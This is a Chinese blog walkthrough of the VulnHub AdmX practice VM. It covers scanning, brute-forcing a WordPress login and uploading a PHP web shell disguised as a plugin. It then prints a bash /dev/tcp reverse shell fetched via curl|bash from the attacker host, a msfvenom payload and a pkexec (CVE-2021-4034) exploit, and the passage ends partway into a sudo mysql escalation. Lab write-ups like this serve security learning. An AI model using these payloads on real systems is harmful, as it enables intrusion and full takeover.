<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- hexo-inject:begin --><!-- hexo-inject:end --><!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="vulnhub4 难度：middle">
<meta property="og:type" content="article">
<meta property="og:title" content="vulnhub4">
<meta property="og:url" content="https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/index.html">
<meta property="og:site_name" content="清风的博客">
<meta property="og:description" content="vulnhub4 难度：middle">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925083425-6stekxr.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925083448-rvx03y6.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925083554-7de8kzv.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925083643-dktziku.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925085600-a1vqny4.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925091213-k7kc1k3.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925091250-lr548jq.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925085913-1zi4ow1.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925090114-fkmt6xs.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925090937-trysikr.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925102916-pgt7usi.png">
<meta property="og:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925103518-xejdo7x.png">
<meta property="article:published_time" content="2023-09-24T16:00:00.000Z">
<meta property="article:modified_time" content="2023-12-05T11:42:03.412Z">
<meta property="article:author" content="清风">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qingfeng.tech/Blogimages/vulhub4/image-20230925083425-6stekxr.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>vulnhub4</title><meta name="robots" content="noindex">
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"><!-- hexo-inject:begin --><!-- hexo-inject:end --><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body class="max-width mx-auto px3 ltr">
    
      <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&text=vulnhub4"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&is_video=false&description=vulnhub4"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=vulnhub4&body=Check out this article: https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&title=vulnhub4"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&name=vulnhub4&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qingfeng.tech/2023/09/25/vulnhub%E6%89%93%E9%9D%B6%E7%AC%AC%E5%9B%9B%E5%91%A8/&t=vulnhub4"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E5%9B%9B%E5%91%A8"><span class="toc-number">1.</span> <span class="toc-text">第四周</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.2.</span> <span class="toc-text">getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">1.3.</span> <span class="toc-text">权限提升</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.1.</span> <span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql%E6%8F%90%E6%9D%83"><span class="toc-number">1.3.2.</span> <span class="toc-text">mysql提权</span></a></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        vulnhub4
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">清风</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2023-09-24T16:00:00.000Z" class="dt-published" itemprop="datePublished">2023-09-25</time>
        
        (Updated: <time datetime="2023-12-05T11:42:03.412Z" class="dt-updated" itemprop="dateModified">2023-12-05</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/%E9%9D%B6%E6%9C%BA/">靶机</a>
    </div>


      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="第四周"><a href="#第四周" class="headerlink" title="第四周"></a>第四周</h1><p>靶机地址: <a target="_blank" rel="noopener" href="https://download.vulnhub.com/admx/AdmX_new.7z">https://download.vulnhub.com/admx/AdmX_new.7z</a></p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>fscan扫一下</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/Tools/fscan<span class="token punctuation">]</span>
└─$ ./fscan_amd64 -h 192.168.120.138 

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __ 
 / /_\/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /
/ /_\\_____\__ \ <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>  
\____/     <span class="token operator">|</span>___/\___<span class="token operator">|</span>_<span class="token operator">|</span>  \__,_<span class="token operator">|</span>\___<span class="token operator">|</span>_<span class="token operator">|</span>\_\   
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start <span class="token function">ping</span>
<span class="token punctuation">(</span>icmp<span class="token punctuation">)</span> Target 192.168.120.138 is alive
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Icmp alive hosts len is: 1
192.168.120.138:80 <span class="token function">open</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> alive ports len is: 1
start vulscan
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle: http://192.168.120.138    code:200 len:10918  title:Apache2 Ubuntu Default Page: It works
已完成 1/1
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> 扫描结束,耗时: 3.580389206s
</code></pre>
<p>全端口再扫一下</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─$ <span class="token function">sudo</span> nmap --min-rate 10000 -p- 192.168.120.138
Starting Nmap 7.94 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2023-09-24 21:12 CST
Nmap scan report <span class="token keyword">for</span> 192.168.120.138
Host is up <span class="token punctuation">(</span>0.00013s latency<span class="token punctuation">)</span>.
Not shown: 65534 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT   STATE SERVICE
80/tcp <span class="token function">open</span>  http
MAC Address: 00:0C:29:67:1B:FC <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: 1 IP address <span class="token punctuation">(</span>1 host up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> 13.40 seconds
</code></pre>
<p>只开放了一个80端口，所以肯定是有web服务，访问<a target="_blank" rel="noopener" href="http://192.168.120.138是一个默认的apache2页面/">http://192.168.120.138是一个默认的apache2页面</a></p>
<p>扫一下他的目录，肯定是有东西的，如果目录没有东西，就找他的域名</p>
<pre class=" language-bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop/Tools/dirsearch<span class="token punctuation">]</span>
└─$ python dirsearch.py -u <span class="token string">"http://192.168.120.138/"</span> -x 403

  _<span class="token operator">|</span><span class="token keyword">.</span> _ _  _  _  _ _<span class="token operator">|</span>_    v0.4.3                                     
 <span class="token punctuation">(</span>_<span class="token operator">||</span><span class="token operator">|</span> _<span class="token punctuation">)</span> <span class="token punctuation">(</span>/_<span class="token punctuation">(</span>_<span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token punctuation">)</span>                                              

Extensions: php, aspx, jsp, html, js <span class="token operator">|</span> HTTP method: GET <span class="token operator">|</span> Threads: 25
Wordlist size: 11714

Output: /home/kali/Desktop/Tools/dirsearch/reports/http_192.168.120.138/__23-09-24_21-35-47.txt

Target: http://192.168.120.138/

<span class="token punctuation">[</span>21:35:47<span class="token punctuation">]</span> Starting:                                                 
<span class="token punctuation">[</span>21:36:13<span class="token punctuation">]</span> 301 -  318B  - /tools  -<span class="token operator">></span>  http://192.168.120.138/tools/
<span class="token punctuation">[</span>21:36:13<span class="token punctuation">]</span> 200 -    2KB - /tools/adminer.php
<span class="token punctuation">[</span>21:36:21<span class="token punctuation">]</span> 200 -    7KB - /wordpress/wp-login.php
<span class="token punctuation">[</span>21:36:21<span class="token punctuation">]</span> 200 -    8KB - /wordpress/

Task Completed
</code></pre>
<p>发现一个wordpress服务</p>
<p>但是加载资源非常卡<br>、<br>看他F12的页面</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925083425-6stekxr.png" alt="image">​</p>
<p>发现他写死访问的资源再html了</p>
<p>用Proxy设置替换一下访问的资源</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925083448-rvx03y6.png" alt="image">​</p>
<p>点击设置，左上角直接搜replace就可以了</p>
<p>然后添加两个Response的Item，就可以替换访问的资源了</p>
<p>其中有一个wordpress的登录页面：</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925083554-7de8kzv.png" alt="image">​</p>
<p>弱口令失败了，就尝试爆破一下吧：（优先找登录页面，尝试爆破再找其他的可利用点，还有一些数据库的登录处）</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925083643-dktziku.png" alt="image">​</p>
<p>只能说这个弱口令有点强</p>
<p>尝试登录,登录成功，访问后台</p>
<pre class=" language-xml"><code class="language-xml">http://192.168.120.128/wordpress/wp-admin/
</code></pre>
<p>发现右下角的版本：</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925085600-a1vqny4.png" alt="image">​</p>
<p>之前看公众号有一个CNVD，只要版本小于6.9都有一个plugin漏洞</p>
<p>写个php木马：</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">/*
Plugin Name: WordPress.org Plugin
Plugin URI:  https://developer.wordpress.org/plugins/the-basics/
Description: Basic WordPress Plugin Header Comment
Version:     2.0
Author:      WordPress.org
Author URI:  https://developer.wordpress.org/
License:     GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
Text Domain: wporg
*/</span>
<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span>
</code></pre>
<p>格式需要按照wordpress的格式写才能生效</p>
<p>把1.php压缩成zip</p>
<p>上传插件：（访问<a target="_blank" rel="noopener" href="http://192.168.120.138/wordpress/wp-admin/plugins.php%EF%BC%89">http://192.168.120.138/wordpress/wp-admin/plugins.php）</a></p>
<p>这里可以上传插件</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925091213-k7kc1k3.png" alt="image">​</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925091250-lr548jq.png" alt="image">​</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>访问<code>http://192.168.120.138/wordpress/wp-content/plugins/1.php?8=phpinfo();</code>​,如果phpinfo生效即为成功</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925085913-1zi4ow1.png" alt="image">​</p>
<p>弹个shell</p>
<p>选择一个目录编辑反弹shell,文件名为1，内容为：</p>
<pre class=" language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/192.168.120.128/7777 0<span class="token operator">></span><span class="token operator">&amp;</span>1
</code></pre>
<p>在这个目录开一个HTTP服务：</p>
<pre class=" language-bash"><code class="language-bash">python -m http.server 8888
</code></pre>
<p>然后监听7777端口：</p>
<pre class=" language-bash"><code class="language-bash">nc -lvnp 7777
</code></pre>
<p>浏览器发起反弹shell请求：</p>
<pre class=" language-xml"><code class="language-xml">http://192.168.120.138/wordpress/wp-content/plugins/1.php?8=system(%22curl%20192.168.120.128:8888/1|bash%22);
</code></pre>
<p>反弹shell之后看一下权限：</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925090114-fkmt6xs.png" alt="image"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="suid提权"><a href="#suid提权" class="headerlink" title="suid提权"></a>suid提权</h3><p>依旧是suid提权先尝试：</p>
<pre class=" language-bash"><code class="language-bash">www-data@wp:/var/www/html/wordpress$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null
<span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f 2<span class="token operator">></span>/dev/null
/snap/core18/1880/bin/mount
/snap/core18/1880/bin/ping
/snap/core18/1880/bin/su
/snap/core18/1880/bin/umount
/snap/core18/1880/usr/bin/chfn
/snap/core18/1880/usr/bin/chsh
/snap/core18/1880/usr/bin/gpasswd
/snap/core18/1880/usr/bin/newgrp
/snap/core18/1880/usr/bin/passwd
/snap/core18/1880/usr/bin/sudo
/snap/core18/1880/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/1880/usr/lib/openssh/ssh-keysign
/snap/snapd/8542/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/su
/usr/bin/at
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/fusermount
</code></pre>
<p>老朋友pkexec，再试一下MSF提权</p>
<pre class=" language-xml"><code class="language-xml">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.120.128  LPORT=7777 -f elf > pb.elf
use exploit/multi/handler
set lport 7777
set lhost 192.168.120.128
set payload linux/x64/meterpreter/reverse_tcp
run
</code></pre>
<p>pkexec提权</p>
<pre class=" language-xml"><code class="language-xml">use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set session 1
set PKEXEC /usr/bin/pkexec
</code></pre>
<p>​<img src="/Blogimages/vulhub4/image-20230925090937-trysikr.png" alt="image">​</p>
<p>这次换一种提权方式吧，感觉每次都是pkexec没有什么提升</p>
<h3 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h3><p>我们还记得刚才有一个Mysql服务，如果mysql是root权限就可以执行命令了</p>
<p>这里说一个mysql的知识点</p>
<p>Windows下：</p>
<pre class=" language-cmd"><code class="language-cmd">mysql> help

For information about MySQL products and services, visit:
   http://www.mysql.com/
For developer information, including the MySQL Reference Manual, visit:
   http://dev.mysql.com/
To buy MySQL Enterprise support, training, or other products, visit:
   https://shop.mysql.com/

List of all MySQL commands:
Note that all text commands must be first on line and end with ';'
?         (\?) Synonym for `help'.
clear     (\c) Clear the current input statement.
connect   (\r) Reconnect to the server. Optional arguments are db and host.
delimiter (\d) Set statement delimiter.
ego       (\G) Send command to mysql server, display result vertically.
exit      (\q) Exit mysql. Same as quit.
go        (\g) Send command to mysql server.
help      (\h) Display this help.
notee     (\t) Don't write into outfile.
print     (\p) Print current command.
prompt    (\R) Change your mysql prompt.
quit      (\q) Quit mysql.
rehash    (\#) Rebuild completion hash.
source    (\.) Execute an SQL script file. Takes a file name as an argument.
status    (\s) Get status information from the server.
tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.
use       (\u) Use another database. Takes database name as argument.
charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.
warnings  (\W) Show warnings after every statement.
nowarning (\w) Don't show warnings after every statement.
resetconnection(\x) Clean session context.

For server side help, type 'help contents'
</code></pre>
<p>可以看到Windwos下的mysql是没有system这个选项的</p>
<p>但是Linux下的help</p>
<pre class=" language-sql"><code class="language-sql">mysql<span class="token operator">></span> help

<span class="token keyword">For</span> information about MySQL products <span class="token operator">and</span> services<span class="token punctuation">,</span> visit:
   http:<span class="token comment" spellcheck="true">//www.mysql.com/</span>
<span class="token keyword">For</span> developer information<span class="token punctuation">,</span> including the MySQL Reference Manual<span class="token punctuation">,</span> visit:
   http:<span class="token comment" spellcheck="true">//dev.mysql.com/</span>
<span class="token keyword">To</span> buy MySQL Enterprise support<span class="token punctuation">,</span> training<span class="token punctuation">,</span> <span class="token operator">or</span> other products<span class="token punctuation">,</span> visit:
   https:<span class="token comment" spellcheck="true">//shop.mysql.com/</span>

List <span class="token keyword">of</span> <span class="token keyword">all</span> MySQL commands:
Note that <span class="token keyword">all</span> <span class="token keyword">text</span> commands must <span class="token number">be</span> <span class="token keyword">first</span> <span class="token keyword">on</span> line <span class="token operator">and</span> <span class="token keyword">end</span> <span class="token keyword">with</span> <span class="token string">';'</span>
?         <span class="token punctuation">(</span>\?<span class="token punctuation">)</span> Synonym <span class="token keyword">for</span> <span class="token punctuation">`</span>help<span class="token string">'.
clear     (\c) Clear the current input statement.
connect   (\r) Reconnect to the server. Optional arguments are db and host.
delimiter (\d) Set statement delimiter.
edit      (\e) Edit command with $EDITOR.
ego       (\G) Send command to mysql server, display result vertically.
exit      (\q) Exit mysql. Same as quit.
go        (\g) Send command to mysql server.
help      (\h) Display this help.
nopager   (\n) Disable pager, print to stdout.
notee     (\t) Don'</span>t <span class="token keyword">write</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span><span class="token punctuation">.</span>
pager     <span class="token punctuation">(</span>\P<span class="token punctuation">)</span> <span class="token keyword">Set</span> PAGER <span class="token punctuation">[</span>to_pager<span class="token punctuation">]</span><span class="token punctuation">.</span> <span class="token keyword">Print</span> the query results via PAGER<span class="token punctuation">.</span>
<span class="token keyword">print</span>     <span class="token punctuation">(</span>\p<span class="token punctuation">)</span> <span class="token keyword">Print</span> <span class="token keyword">current</span> command<span class="token punctuation">.</span>
prompt    <span class="token punctuation">(</span>\R<span class="token punctuation">)</span> Change your mysql prompt<span class="token punctuation">.</span>
quit      <span class="token punctuation">(</span>\q<span class="token punctuation">)</span> Quit mysql<span class="token punctuation">.</span>
rehash    <span class="token punctuation">(</span>\#<span class="token punctuation">)</span> Rebuild completion <span class="token keyword">hash</span><span class="token punctuation">.</span>
source    <span class="token punctuation">(</span>\<span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token keyword">Execute</span> an SQL script <span class="token keyword">file</span><span class="token punctuation">.</span> Takes <span class="token number">a</span> <span class="token keyword">file</span> name <span class="token keyword">as</span> an argument<span class="token punctuation">.</span>
<span class="token keyword">status</span>    <span class="token punctuation">(</span>\s<span class="token punctuation">)</span> Get <span class="token keyword">status</span> information <span class="token keyword">from</span> the server<span class="token punctuation">.</span>
system    <span class="token punctuation">(</span>\<span class="token operator">!</span><span class="token punctuation">)</span> <span class="token keyword">Execute</span> <span class="token number">a</span> system shell command<span class="token punctuation">.</span>
tee       <span class="token punctuation">(</span>\T<span class="token punctuation">)</span> <span class="token keyword">Set</span> <span class="token keyword">outfile</span> <span class="token punctuation">[</span>to_outfile<span class="token punctuation">]</span><span class="token punctuation">.</span> Append everything <span class="token keyword">into</span> given <span class="token keyword">outfile</span><span class="token punctuation">.</span>
<span class="token keyword">use</span>       <span class="token punctuation">(</span>\u<span class="token punctuation">)</span> <span class="token keyword">Use</span> another <span class="token keyword">database</span><span class="token punctuation">.</span> Takes <span class="token keyword">database</span> name <span class="token keyword">as</span> argument<span class="token punctuation">.</span>
<span class="token keyword">charset</span>   <span class="token punctuation">(</span>\C<span class="token punctuation">)</span> Switch <span class="token keyword">to</span> another <span class="token keyword">charset</span><span class="token punctuation">.</span> Might <span class="token number">be</span> needed <span class="token keyword">for</span> processing binlog <span class="token keyword">with</span> multi<span class="token operator">-</span>byte charsets<span class="token punctuation">.</span>
<span class="token keyword">warnings</span>  <span class="token punctuation">(</span>\W<span class="token punctuation">)</span> <span class="token keyword">Show</span> <span class="token keyword">warnings</span> <span class="token keyword">after</span> every statement<span class="token punctuation">.</span>
nowarning <span class="token punctuation">(</span>\w<span class="token punctuation">)</span> Don<span class="token string">'t show warnings after every statement.
resetconnection(\x) Clean session context.
query_attributes Sets string parameters (name1 value1 name2 value2 ...) for the next query to pick up.
ssl_session_data_print Serializes the current SSL session data to stdout or file

For server side help, type '</span>help contents'
</code></pre>
<p>可以看到Linux下的mysql是有system选项的，可以利用<code>\!</code>​执行命令</p>
<p>回到题目，我们既然没有权限连接mysql，这里就想到sudo了，但是要有密码和账户</p>
<p>无疑就是<code>cat /etc/passwd</code>​了</p>
<pre class=" language-bash"><code class="language-bash">www-data@wp:/$ <span class="token function">cat</span> /etc/passwd
<span class="token function">cat</span> /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="token punctuation">(</span>admin<span class="token punctuation">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
wpadmin:x:1001:1001::/home/wpadmin:/bin/bash
</code></pre>
<p>发现这里还有一个wpadmin账号</p>
<p>我们尝试使用<code>su wpadmin</code>​，密码<code>adam14</code>​登入,成功！</p>
<p>那么就可以<code>sudo -l</code>​看一下哪些程序有root权限了</p>
<p>​<img src="/Blogimages/vulhub4/image-20230925102916-pgt7usi.png" alt="image">​</p>
<p>这里刚好就是mysql</p>
<p>所以按照他的方式连接一下：<code>sudo /usr/bin/mysql -u root -D wordpress -p</code>​</p>
